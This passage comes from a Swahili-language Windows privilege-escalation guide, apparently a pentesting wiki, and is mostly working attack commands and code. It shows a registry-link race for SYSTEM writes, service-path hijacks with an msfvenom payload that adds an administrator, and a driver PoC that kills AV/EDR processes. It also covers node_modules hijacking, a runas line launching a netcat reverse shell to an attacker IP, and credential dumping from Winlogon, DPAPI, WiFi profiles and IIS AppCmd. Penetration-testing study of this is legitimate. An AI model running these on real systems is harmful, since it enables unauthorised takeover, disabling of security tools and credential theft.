2. Trigger secure-desktop copy (kwa mfano, **LockWorkstation**), ambayo huanzisha AT broker flow.
3. **Shinda race** kwa kuweka **oplock** kwenye `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; oplock inapofire, badilisha **HKLM Session ATConfig** key iwe **registry link** inayoelekeza kwenye protected HKLM target.
4. SYSTEM itaandika value iliyochaguliwa na attacker kwenye HKLM path iliyoelekezwa upya.

Baada ya kupata arbitrary HKLM value write, tumia hiyo kwa LPE kwa kubadilisha service configuration values:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Chagua service ambayo user wa kawaida anaweza ku-start (kwa mfano, **`msiserver`**) kisha i-trigger baada ya write. **Kumbuka:** public exploit implementation hufunga workstation kama sehemu ya race.

Zana za mfano (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Ruhusa za AppendData/AddSubdirectory za registry ya services

Ikiwa una ruhusa hii kwenye registry, inamaanisha **unaweza kuunda registry ndogo kutoka kwenye registry hii**. Kwa services za Windows, hii **inatosha kutekeleza code yoyote:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Ikiwa path ya executable haijawekwa ndani ya alama za nukuu, Windows itajaribu kutekeleza kila sehemu inayomalizika kabla ya nafasi.

Kwa mfano, kwa path _C:\Program Files\Some Folder\Service.exe_ Windows itajaribu kutekeleza:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Orodhesha njia zote za huduma zisizo katika nukuu, ukiondoa zile za huduma zilizojengewa ndani ya Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Unaweza kugundua na kutumia** vulnerability hii kwa metasploit: `exploit/windows/local/trusted\_service\_path` Unaweza kuunda service binary kwa mikono kwa kutumia metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Hatua za Urejeshaji

Windows inawaruhusu watumiaji kubainisha hatua za kuchukuliwa ikiwa service itashindwa. Kipengele hiki kinaweza kusanidiwa kuelekeza kwenye binary. Ikiwa binary hii inaweza kubadilishwa, privilege escalation inaweza kuwezekana. Maelezo zaidi yanapatikana katika [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Programu

### Programu Zilizosakinishwa

Kagua **ruhusa za binaries** (huenda ukaweza kubadilisha moja na kufanya privilege escalation) na za **folda** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Ruhusa za Kuandika

Angalia ikiwa unaweza kurekebisha faili fulani ya config ili kusoma faili maalum, au ikiwa unaweza kurekebisha binary ambayo itatekelezwa na akaunti ya Administrator (schedtasks).

Njia ya kutafuta ruhusa dhaifu za folda/faili kwenye mfumo ni kutumia:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ hupakia kiotomatiki DLL yoyote ya plugin iliyo ndani ya subfolders za `plugins`. Ikiwa kuna portable/copy install inayoweza kuandikwa, kuweka plugin hasidi hutoa automatic code execution ndani ya `notepad++.exe` kila inapozinduliwa, ikiwemo kutoka `DllMain` na plugin callbacks.

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Endesha wakati wa kuanzisha mfumo

**Angalia ikiwa unaweza ku-overwrite registry au binary inayotarajiwa kutekelezwa na user mwingine.**\
**Soma** **ukurasa ufuatao** ili ujifunze zaidi kuhusu **autoruns locations zinazovutia za ku-escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Tafuta **third party drivers zisizo za kawaida/zilizo vulnerable** zinazowezekana.
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Ikiwa driver inafichua primitive ya arbitrary kernel read/write (jambo la kawaida katika IOCTL handlers zilizoundwa vibaya), unaweza kufanya privilege escalation kwa kuiba SYSTEM token moja kwa moja kutoka kernel memory. Tazama technique ya hatua kwa hatua hapa:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Kwa race-condition bugs ambapo vulnerable call hufungua Object Manager path inayodhibitiwa na attacker, kupunguza kasi ya lookup kwa makusudi (kwa kutumia components zenye max-length au deep directory chains) kunaweza kuongeza muda wa fursa kutoka microseconds hadi makumi ya microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities hukuwezesha kupanga layouts zinazotabirika, kutumia vibaya writable HKLM/HKU descendants, na kubadilisha metadata corruption kuwa kernel paged-pool overflows bila custom driver. Jifunze chain nzima hapa:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direct-mode type confusion from attacker-controlled paths

Baadhi ya drivers hupokea registry path kutoka userland, huthibitisha tu kwamba ni UTF-16 string halali, kisha huita `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` ikiwa na `RTL_QUERY_REGISTRY_DIRECT` kwenye stack scalar kama `int readValue`. Ikiwa `RTL_QUERY_REGISTRY_TYPECHECK` haipo, `EntryContext` hutafsiriwa kulingana na registry type **halisi**, si type ambayo developer alitarajia.

Hii huunda primitives mbili muhimu:

- **Confused deputy / oracle**: absolute `\Registry\...` path inayodhibitiwa na user humruhusu driver ku-query keys zilizochaguliwa na attacker, kuvuja kwa uwepo wa key kupitia return codes/logs, na wakati mwingine kusoma values ambazo caller hangeweza kufikia moja kwa moja.
- **Kernel memory corruption**: scalar destination kama `&readValue` hutafsiriwa kimakosa kama `REG_QWORD`, `UNICODE_STRING`, au sized binary buffer kulingana na registry value type.

Maelezo ya practical exploitation:

- **Windows 8+ mitigation**: ikiwa query itafikia **untrusted hive** ikiwa na `RTL_QUERY_REGISTRY_DIRECT` lakini bila `RTL_QUERY_REGISTRY_TYPECHECK`, kernel callers hu-crash kwa `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Ili kuhifadhi exploitability, tafuta **attacker-writable keys ndani ya trusted system hives** badala ya kuweka values chini ya `HKCU`.
- **Trusted-hive staging**: tumia NtObjectManager ku-enumerate writable descendants za `\Registry\Machine`, kisha endesha tena scan kwa token iliyorudiwa ya **low-integrity** ili kupata keys zinazofikika kutoka sandboxed contexts:
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: uandishi wa moja kwa moja wa baiti 8 kwenye `int` ya baiti 4 huharibu data iliyo karibu kwenye stack na unaweza ku-overwrite kwa sehemu pointer ya callback/function iliyo karibu.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode inatarajia `EntryContext` ionyeshe `UNICODE_STRING`. Ikiwa code kwanza inapakia `REG_DWORD` inayodhibitiwa na attacker kwenye scalar ya stack, kisha inatumia buffer hiyo hiyo kusoma string, attacker hudhibiti `Length`/`MaximumLength` na huathiri kwa sehemu pointer ya `Buffer`, hivyo kusababisha kernel write inayodhibitika kwa kiasi.
- **`REG_BINARY`**: kwa data kubwa ya binary, direct mode huchukulia `LONG` ya kwanza kwenye `EntryContext` kuwa ukubwa wa buffer wenye alama. Ikiwa usomaji wa awali wa `REG_DWORD` utaacha thamani hasi inayodhibitiwa na attacker kwenye scalar iliyotumiwa tena, query inayofuata ya `REG_BINARY` hunakili baiti za attacker moja kwa moja juu ya stack slots zilizo karibu, ambalo mara nyingi ndilo njia rahisi zaidi ya ku-overwrite pointer kamili ya callback.

Muundo madhubuti wa hunting: **usomaji wa registry wa aina tofauti kwenye variable ile ile ya stack bila kuianzisha upya**. Tafuta `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, pointer za `EntryContext` zinazotumiwa tena, na code paths ambapo usomaji wa kwanza wa registry huamua ikiwa usomaji wa pili utafanyika.

#### Kutumia vibaya kukosekana kwa FILE_DEVICE_SECURE_OPEN kwenye device objects (LPE + EDR kill)

Baadhi ya drivers zilizosainiwa za third-party huunda device object yao kwa SDDL thabiti kupitia IoCreateDeviceSecure lakini husahau kuweka FILE_DEVICE_SECURE_OPEN kwenye DeviceCharacteristics. Bila flag hii, secure DACL hailazimishwi wakati device inafunguliwa kupitia path iliyo na component ya ziada, hivyo kumruhusu mtumiaji yeyote asiye na privileges kupata handle kwa kutumia namespace path kama:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (kutoka kwenye case halisi ya ulimwengu)

Mara mtumiaji anapoweza kufungua device, privileged IOCTLs zinazotolewa na driver zinaweza kutumiwa vibaya kwa LPE na tampering. Uwezo ulioonekana kwenye mazingira halisi ni pamoja na:
- Kurejesha handles zenye full access kwa processes za kiholela (token theft / SYSTEM shell kupitia DuplicateTokenEx/CreateProcessAsUser).
- Raw disk read/write isiyo na vizuizi (offline tampering, mbinu za persistence wakati wa boot).
- Kukatisha processes za kiholela, ikiwemo Protected Process/Light (PP/PPL), na hivyo kuwezesha kuua AV/EDR kutoka user land kupitia kernel.

Muundo mdogo wa PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mikakati ya kuzuia kwa developers
- Weka kila wakati FILE_DEVICE_SECURE_OPEN unapounda device objects zinazokusudiwa kuzuiwa na DACL.
- Thibitisha muktadha wa caller kwa operations zenye privileged access. Ongeza ukaguzi wa PP/PPL kabla ya kuruhusu process termination au handle returns.
- Zuia IOCTLs (access masks, METHOD_*, input validation) na uzingatie brokered models badala ya privileged access ya moja kwa moja ya kernel.

Mawazo ya utambuzi kwa defenders
- Fuatilia user-mode opens za majina ya device yanayotiliwa shaka (mfano, \\ .\\amsdk*) na mfuatano maalum wa IOCTL unaoashiria abuse.
- Tekeleza Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) na udumishe allow/deny lists zako.

## PATH DLL Hijacking

Ikiwa una **write permissions ndani ya folder iliyo kwenye PATH**, unaweza kuweza kuhijack DLL inayopakiwa na process na **kuongeza privileges**.

Kagua permissions za folders zote zilizo ndani ya PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Kwa maelezo zaidi kuhusu jinsi ya kutumia vibaya ukaguzi huu:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Utekaji wa module resolution wa Node.js / Electron kupitia `C:\node_modules`

Hii ni variant ya **Windows uncontrolled search path** inayoathiri applications za **Node.js** na **Electron** zinapofanya bare import kama `require("foo")` na module inayotarajiwa **haipo**.

Node hutatua packages kwa kupita kwenye directory tree kuelekea juu na kukagua folders za `node_modules` katika kila parent. Kwenye Windows, utafutaji huo unaweza kufika kwenye drive root, hivyo application iliyoanzishwa kutoka `C:\Users\Administrator\project\app.js` inaweza kuishia kukagua:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ikiwa **low-privileged user** anaweza kuunda `C:\node_modules`, anaweza kuweka `foo.js` malicious (au package folder) na kusubiri **higher-privileged Node/Electron process** itatue dependency inayokosekana. Payload hutekelezwa katika security context ya victim process, hivyo hii huwa **LPE** wakati target inaendesha kama administrator, kutoka kwenye elevated scheduled task/service wrapper, au kutoka kwenye auto-started privileged desktop app.

Hili hutokea hasa wakati:

- dependency imetangazwa katika `optionalDependencies`
- third-party library inafunga `require("foo")` ndani ya `try/catch` na inaendelea baada ya failure
- package iliondolewa kwenye production builds, ikaachwa wakati wa packaging, au ikashindwa kusakinishwa
- vulnerable `require()` iko ndani kabisa ya dependency tree badala ya kuwa kwenye main application code

### Kutafuta targets zilizo vulnerable

Tumia **Procmon** kuthibitisha resolution path:

- Filter kwa `Process Name` = target executable (`node.exe`, Electron app EXE, au wrapper process)
- Filter kwa `Path` `contains` `node_modules`
- Zingatia `NAME NOT FOUND` na successful open ya mwisho chini ya `C:\node_modules`

Mifano muhimu ya code-review katika files za `.asar` zilizofunguliwa au application sources:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Tambua **jina la package inayokosekana** kutoka Procmon au ukaguzi wa source.
2. Unda directory ya root lookup ikiwa bado haipo:
```powershell
mkdir C:\node_modules
```
3. Weka module kwa jina halisi linalotarajiwa:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Trigger victim application. Ikiwa application itajaribu `require("foo")` na module halali haipo, Node inaweza kupakia `C:\node_modules\foo.js`.

Mifano ya real-world ya optional modules zinazokosekana na kuendana na pattern hii ni pamoja na `bluebird` na `utf-8-validate`, lakini **technique** ndiyo sehemu inayoweza kutumiwa tena: tafuta **missing bare import** yoyote ambayo privileged Windows Node/Electron process ita-resolve.

### Detection and hardening ideas

- Tuma alert mtumiaji anapounda `C:\node_modules` au kuandika files/packages mpya za `.js` humo.
- Hunt kwa high-integrity processes zinazosoma kutoka `C:\node_modules\*`.
- Package runtime dependencies zote kwenye production na audit matumizi ya `optionalDependencies`.
- Kagua third-party code ili kutafuta patterns za kimya za `try { require("...") } catch {}`.
- Disable optional probes wakati library inai-support (kwa mfano, baadhi ya deployments za `ws` zinaweza kuepuka probe ya zamani ya `utf-8-validate` kwa kutumia `WS_NO_UTF_8_VALIDATE=1`).

## Mtandao

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Angalia kompyuta nyingine zinazojulikana zilizoandikwa moja kwa moja kwenye hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Miingiliano ya Mtandao na DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Porti Zilizo Wazi

Kagua **huduma zilizowekewa vikwazo** kutoka nje
```bash
netstat -ano #Opened ports?
```
### Jedwali la Uelekezaji
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Jedwali la ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Sheria za Firewall

[**Angalia ukurasa huu kwa commands zinazohusiana na Firewall**](../basic-cmd-for-pentesters.md#firewall) **(orodhesha rules, tengeneza rules, zima, zima...)**

[Commands zaidi za network enumeration hapa](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` pia inaweza kupatikana katika `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ukipata mtumiaji wa root, unaweza kusikiliza kwenye port yoyote (mara ya kwanza unapotumia `nc.exe` kusikiliza kwenye port, itauliza kupitia GUI ikiwa `nc` inapaswa kuruhusiwa na firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Ili kuanzisha bash kwa urahisi kama root, unaweza kujaribu `--default-user root`

Unaweza kuchunguza mfumo wa faili wa `WSL` kwenye folda `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Credentials za Windows

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credential Manager / Windows vault

Kutoka [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault huhifadhi credentials za watumiaji kwa ajili ya servers, websites na programs nyingine ambazo **Windows** inaweza **kuwaingiza watumiaji kiotomatiki**. Kwa mtazamo wa kwanza, inaweza kuonekana kwamba watumiaji sasa wanaweza kuhifadhi credentials zao za Facebook, credentials za Twitter, credentials za Gmail, n.k., ili waingizwe kiotomatiki kupitia browsers. Lakini sivyo.

Windows Vault huhifadhi credentials ambazo Windows inaweza kutumia kuwaingiza watumiaji kiotomatiki, kumaanisha kwamba **Windows application yoyote inayohitaji credentials ili kufikia resource** (server au website) **inaweza kutumia Credential Manager** & Windows Vault na kutumia credentials zilizotolewa badala ya watumiaji kuingiza username na password kila mara.

Isipokuwa applications zishirikiane na Credential Manager, sidhani kama zinaweza kutumia credentials za resource fulani. Kwa hiyo, ikiwa application yako inataka kutumia vault, inapaswa kwa namna fulani **kuwasiliana na credential manager na kuomba credentials za resource hiyo** kutoka kwenye default storage vault.

Tumia `cmdkey` kuorodhesha credentials zilizohifadhiwa kwenye mashine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Kisha unaweza kutumia `runas` pamoja na chaguo la `/savecred` ili kutumia credentials zilizohifadhiwa. Mfano ufuatao unaita binary ya mbali kupitia share ya SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Kutumia `runas` kwa kutumia seti ya credentials iliyotolewa.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Kumbuka kwamba mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), au kutoka kwenye [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

**Data Protection API (DPAPI)** hutoa mbinu ya symmetric encryption ya data, inayotumiwa hasa ndani ya mfumo wa uendeshaji wa Windows kwa symmetric encryption ya asymmetric private keys. Usimbaji huu hutumia siri ya mtumiaji au mfumo ili kuchangia kwa kiasi kikubwa katika entropy.

**DPAPI huwezesha usimbaji wa keys kupitia symmetric key inayotokana na login secrets za mtumiaji**. Katika hali zinazohusisha system encryption, hutumia system domain authentication secrets.

Encrypted user RSA keys, kwa kutumia DPAPI, huhifadhiwa katika directory ya `%APPDATA%\Microsoft\Protect\{SID}`, ambapo `{SID}` inawakilisha [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) ya mtumiaji. **DPAPI key, inayopatikana pamoja na master key inayolinda private keys za mtumiaji katika file hiyo hiyo**, kwa kawaida huwa na bytes 64 za data random. (Ni muhimu kutambua kwamba ufikiaji wa directory hii umezuiwa, hivyo kuorodhesha yaliyomo kupitia amri ya `dir` katika CMD haiwezekani, ingawa inaweza kuorodheshwa kupitia PowerShell.)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Unaweza kutumia **mimikatz module** `dpapi::masterkey` pamoja na arguments zinazofaa (`/pvk` au `/rpc`) ili ku-decrypt.

**credentials files protected by the master password** kwa kawaida hupatikana katika:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Unaweza kutumia **mimikatz module** `dpapi::cred` pamoja na `/masterkey` inayofaa kusimbua.\
Unaweza **extract DPAPI** **masterkeys** nyingi kutoka **memory** kwa kutumia module ya `sekurlsa::dpapi` (ikiwa una root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** hutumiwa mara nyingi kwa ajili ya **scripting** na kazi za automation, kama njia ya kuhifadhi credentials zilizosimbwa kwa urahisi. Credentials hulindwa kwa kutumia **DPAPI**, ambayo kwa kawaida humaanisha kuwa zinaweza kusimbuliwa na user yuleyule kwenye computer ileile ambako ziliundwa.

Ili **decrypt** PS credentials kutoka kwenye file inayozihifadhi, unaweza kufanya:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Muunganisho wa RDP Uliohifadhiwa

Unaweza kuzipata katika `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
na katika `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Amri Zilizotekelezwa Hivi Karibuni
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Kidhibiti cha Credentials cha Remote Desktop**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Tumia module ya **Mimikatz** `dpapi::rdg` pamoja na `/masterkey` inayofaa ili **kusimbua faili zozote za .rdg**\
Unaweza **kutoa DPAPI masterkeys nyingi** kutoka kwenye memory kwa kutumia module ya Mimikatz `sekurlsa::dpapi`

### Sticky Notes

Mara nyingi watu hutumia app ya Sticky Notes kwenye workstations za Windows **kuhifadhi nywila** na taarifa nyingine, bila kutambua kuwa ni faili la database. Faili hili linapatikana kwenye `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` na daima inafaa kulitafuta na kulichunguza.

### AppCmd.exe

**Kumbuka kwamba ili kurejesha nywila kutoka kwa AppCmd.exe unahitaji kuwa Administrator na kuendesha chini ya kiwango cha High Integrity.**\
**AppCmd.exe** inapatikana kwenye directory ya `%systemroot%\system32\inetsrv\`.\
Ikiwa faili hili lipo, basi kuna uwezekano kwamba baadhi ya **credentials** zimesanidiwa na zinaweza **kurejeshwa**.

Code hii ilitolewa kutoka kwa [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Angalia kama `C:\Windows\CCM\SCClient.exe` ipo .\
Installers **huendeshwa kwa marupurupu ya SYSTEM**, wengi wako katika hatari ya **DLL Sideloading (Maelezo kutoka** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Faili na Registry (Vitambulisho)

### Vitambulisho vya Putty
```bash
